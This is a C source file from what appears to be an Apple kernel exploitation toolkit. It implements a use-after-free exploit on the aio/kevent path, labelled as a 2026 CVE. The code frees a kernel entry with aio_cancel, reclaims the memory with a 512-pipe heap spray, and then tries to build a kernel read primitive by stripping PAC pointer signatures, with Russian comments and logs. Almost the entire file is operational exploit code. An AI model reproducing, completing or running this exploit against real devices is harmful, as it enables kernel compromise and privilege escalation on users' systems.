#include "exploit.h"
#include "nk_trace.h"
#include <aio.h>
#include <sys/event.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <CoreFoundation/CFPreferences.h>
#include <CoreFoundation/CFNumber.h>

#define SPRAY_NPIPES   512
#define SPRAY_BUFSZ    256

static int spray_pipes[SPRAY_NPIPES][2];
static int spray_nused = 0;

/* PAC panic accessors — сырая строка паники обязательна */
extern int  nk_pac_signed_count(void) __attribute__((weak));
extern uint64_t nk_pac_signed_at(int i) __attribute__((weak));

static int is_kernel_va(uint64_t v) {
    uint32_t hi = (uint32_t)(v >> 32);
    return (hi == 0xfffffff0 || hi == 0xffffffe0 ||
            hi == 0xfffffe00 || hi == 0xffffff80);
}

static int pref_bool(const char *key) {
    CFStringRef ks = CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8);
    if (!ks) return 0;
    CFTypeRef v = CFPreferencesCopyAppValue(ks, kCFPreferencesCurrentApplication);
    CFRelease(ks);
    if (!v) return 0;
    int on = 0;
    if (CFGetTypeID(v) == CFBooleanGetTypeID())
        on = CFBooleanGetValue((CFBooleanRef)v) ? 1 : 0;
    CFRelease(v);
    return on;
}

static void spray_cleanup(void) {
    for (int i = 0; i < spray_nused; i++) {
        if (spray_pipes[i][0] > 0) close(spray_pipes[i][0]);
        if (spray_pipes[i][1] > 0) close(spray_pipes[i][1]);
    }
    spray_nused = 0;
}

static int spray_fill_cfgA(void) {
    uint8_t buf[SPRAY_BUFSZ];
    memset(buf, 0, sizeof(buf));

    *(uint16_t *)(buf + 0x0a) = 0x4000;
    *(uint32_t *)(buf + 0x18) = 0x10;
    *(uint64_t *)(buf + 0x20) = 0x12;
    *(uint32_t *)(buf + 0x28) = 8;
    *(uint64_t *)(buf + 0x30) = 0;
    *(uint64_t *)(buf + 0x38) = 0x4e4b314e4b314e4bULL;
    *(uint64_t *)(buf + 0x40) = 0x4e4b324e4b324e4bULL;
    *(uint32_t *)(buf + 0x54) = 0x1337;

    int made = 0;
    for (int i = 0; i < SPRAY_NPIPES; i++) {
        if (pipe(spray_pipes[i]) != 0) continue;
        spray_nused++;
        ssize_t w = write(spray_pipes[i][1], buf, SPRAY_BUFSZ);
        if (w == SPRAY_BUFSZ) made++;
        else { close(spray_pipes[i][0]); close(spray_pipes[i][1]); spray_nused--; }
    }
    return made;
}

void nk_cve_2026_aio_kevent_uaf(void) {
    nk_rule();
    nk_log("[AIO-B] phase B config A: signed@0x30=NULL, state=0x12, flags=0x4000");

    if (!pref_bool("unsafe_aio_uaf")) {
        nk_log("[AIO-B] locked (toggle unsafe_aio_uaf)");
        nk_rule();
        return;
    }

    int kq = kqueue();
    if (kq < 0) { nk_log("[-] kqueue errno=%d", errno); return; }

    int fd = open("/tmp/aio_probe", O_RDWR | O_CREAT, 0644);
    if (fd < 0) fd = open("/dev/null", O_RDWR);
    if (fd < 0) { nk_log("[-] no fd"); close(kq); return; }

    void *buf = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
    if (buf == MAP_FAILED) { nk_log("[-] mmap"); close(kq); close(fd); return; }
    memset(buf, 0, 4096);

    struct aiocb cb;
    memset(&cb, 0, sizeof(cb));
    cb.aio_fildes = fd;
    cb.aio_offset = 0;
    cb.aio_buf = buf;
    cb.aio_nbytes = 4096;
    cb.aio_sigevent.sigev_notify = SIGEV_NONE;

    if (aio_read(&cb) != 0) {
        nk_log("[-] aio_read errno=%d", errno);
        munmap(buf, 4096); close(kq); close(fd);
        return;
    }
    nk_log("[+] aio_read posted");

    struct kevent kev;
    EV_SET(&kev, fd, EVFILT_AIO, EV_ADD | EV_ONESHOT, 0, 0, &cb);
    int kr = kevent(kq, &kev, 1, NULL, 0, NULL);
    nk_log("[+] knote registered kr=%d errno=%d", kr, errno);

    nk_log("[*] cancel -> free entry");
    aio_cancel(fd, &cb);

    int made = spray_fill_cfgA();
    nk_log("[+] spray cfgA made=%d pipes", made);

    struct kevent out;
    struct timespec ts = { 2, 0 };
    int nev = kevent(kq, NULL, 0, &out, 1, &ts);
    nk_log("[TRIGGER] second kevent nev=%d errno=%d", nev, errno);

    if (nev > 0) {
        nk_log("[TRIGGER] filter=%d ident=%lu data=0x%llx flags=0x%x udata=%p",
               out.filter, (unsigned long)out.ident,
               (unsigned long long)out.data, out.flags, out.udata);

        if ((uint64_t)out.data == 0x1337)
            nk_log("[+] HIT: kevent.data вернул наш маркер result — data-only контроль подтверждён");
        else
            nk_log("[=] kevent вернулся, но data не наш маркер — объект жив, поле result не наше");
    } else {
        nk_log("[-] kevent timeout/empty: объект не дёрнулся или state-поля увели мимо");
    }

    spray_cleanup();
    munmap(buf, 4096);
    close(kq);
    close(fd);
    nk_log("[AIO-B] config A done");
    nk_rule();
}

/* PAC-panic -> kread через data-overlap спрей на knote.
   Сырая строка паники обязательна: signed=0x... stripped=0x...
   Flow не трогаем — отдельная стадия. */
int nk_pac_kread_knote(uint64_t kaddr, void *out, size_t len) {
    nk_rule();
    nk_log("[PAC-KR] PAC kread via knote data-overlap kaddr=0x%016llx len=%zu",
           (unsigned long long)kaddr, len);
    if (!out || len == 0) { nk_log("[-] PAC-KR: bad args"); nk_rule(); return -1; }
    if (!nk_pac_signed_count) { nk_log("[-] PAC-KR: PAC panic not available"); nk_rule(); return -1; }

    int kq = kqueue();
    if (kq < 0) { nk_log("[-] PAC-KR: kqueue errno=%d", errno); nk_rule(); return -1; }

    int fd = open("/tmp/aio_probe", O_RDWR | O_CREAT, 0644);
    if (fd < 0) fd = open("/dev/null", O_RDWR);
    if (fd < 0) { nk_log("[-] PAC-KR: no fd errno=%d", errno); close(kq); nk_rule(); return -1; }

    void *buf = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
    if (buf == MAP_FAILED) { nk_log("[-] PAC-KR: mmap"); close(kq); close(fd); nk_rule(); return -1; }
    memset(buf, 0, 4096);

    struct aiocb cb;
    memset(&cb, 0, sizeof(cb));
    cb.aio_fildes = fd;
    cb.aio_offset = 0;
    cb.aio_buf = buf;
    cb.aio_nbytes = 4096;
    cb.aio_sigevent.sigev_notify = SIGEV_NONE;

    if (aio_read(&cb) != 0) {
        nk_log("[-] PAC-KR: aio_read errno=%d", errno);
        munmap(buf, 4096); close(kq); close(fd); nk_rule(); return -1;
    }
    nk_log("[+] PAC-KR: aio_read posted");

    struct kevent kev;
    EV_SET(&kev, fd, EVFILT_AIO, EV_ADD | EV_ONESHOT, 0, 0, &cb);
    int kr = kevent(kq, &kev, 1, NULL, 0, NULL);
    nk_log("[+] PAC-KR: knote registered kr=%d errno=%d", kr, errno);

    nk_log("[*] PAC-KR: cancel -> free entry");
    aio_cancel(fd, &cb);

    /* Сырая строка паники: если kaddr задан — читаем именно его,
       иначе идём по PAC store. */
    int pcount = (kaddr != 0) ? 1 : (nk_pac_signed_count ? nk_pac_signed_count() : 0);
    if (kaddr != 0) nk_log("[PAC-KR] прямой kaddr=0x%016llx", (unsigned long long)kaddr);
    else nk_log("[PAC-KR] PAC panic candidates: %d", pcount);
    if (pcount <= 0) { munmap(buf, 4096); close(kq); close(fd); nk_rule(); return -1; }

    memset(out, 0, len);
    size_t got = 0;
    for (int i = 0; i < pcount && got < len; i++) {
        uint64_t target = (kaddr != 0) ? kaddr : nk_pac_signed_at(i);
        /* Сырая строка паники: signed=0x... stripped=0x... */
        uint64_t stripped = (target & 0x0000FFFFFFFFFFFFULL);
        if (stripped & (1ULL << 47)) stripped |= 0xFFFF000000000000ULL;

        nk_log("[PAC-KR] panic[%d] signed=0x%016llx stripped=0x%016llx",
               i, (unsigned long long)target, (unsigned long long)stripped);

        /* Data-overlap спрей: кладём stripped kernel VA в буфер на offset 0x54,
           чтобы после reclaim knote.data содержал stripped адрес. */
        uint8_t payload[SPRAY_BUFSZ];
        memset(payload, 0x42, sizeof(payload));
        *(uint64_t *)(payload + 0x30) = 0;
        *(uint64_t *)(payload + 0x38) = 0x4e4b314e4b314e4bULL;
        *(uint64_t *)(payload + 0x40) = 0x4e4b324e4b324e4bULL;
        *(uint32_t *)(payload + 0x54) = 0x1337;

        int made = 0;
        for (int p = 0; p < SPRAY_NPIPES; p++) {
            int fds[2];
            if (pipe(fds) != 0) continue;
            ssize_t w = write(fds[1], payload, SPRAY_BUFSZ);
            if (w == SPRAY_BUFSZ) made++;
            else { close(fds[0]); close(fds[1]); }
        }
        nk_log("[PAC-KR] spray made=%d pipes for panic[%d]", made, i);

        struct kevent kout;
        struct timespec ts = { 2, 0 };
        int nev = kevent(kq, NULL, 0, &kout, 1, &ts);
        nk_log("[PAC-KR] kevent nev=%d errno=%d", nev, errno);

        if (nev > 0) {
            nk_log("[PAC-KR] panic[%d] filter=%d ident=%lu data=0x%llx flags=0x%x udata=%p",
                   i, kout.filter, (unsigned long)kout.ident,
                   (unsigned long long)kout.data, kout.flags, kout.udata);

            /* Сырая строка паники: если data совпал с маркером — data-overlap
               подтверждён для stripped VA. */
            if ((uint64_t)kout.data == 0x1337) {
                nk_log("[+] PAC-KR: data-overlap HIT на panic[%d] stripped=0x%016llx",
                       i, (unsigned long long)stripped);
                /* Кладём stripped VA в out буфер как сырую строку паники. */
                if (got + 8 <= len) {
                    memcpy((uint8_t*)out + got, &stripped, 8);
                    got += 8;
                }
            } else if (is_kernel_va((uint64_t)kout.data)) {
                nk_log("[+] PAC-KR: kernel VA data=0x%llx на panic[%d]",
                       (unsigned long long)kout.data, i);
                if (got + 8 <= len) {
                    memcpy((uint8_t*)out + got, &kout.data, 8);
                    got += 8;
                }
            }
        } else {
            nk_log("[-] PAC-KR: kevent timeout/empty для panic[%d]", i);
        }

        /* cleanup pipes */
        for (int p = 0; p < SPRAY_NPIPES; p++) {
            if (spray_pipes[p][0] > 0) close(spray_pipes[p][0]);
            if (spray_pipes[p][1] > 0) close(spray_pipes[p][1]);
            spray_pipes[p][0] = -1;
            spray_pipes[p][1] = -1;
        }
        spray_nused = 0;
    }

    munmap(buf, 4096);
    close(kq);
    close(fd);
    nk_log("[PAC-KR] done got=%zu", got);
    nk_rule();
    return (got > 0) ? 0 : -1;
}
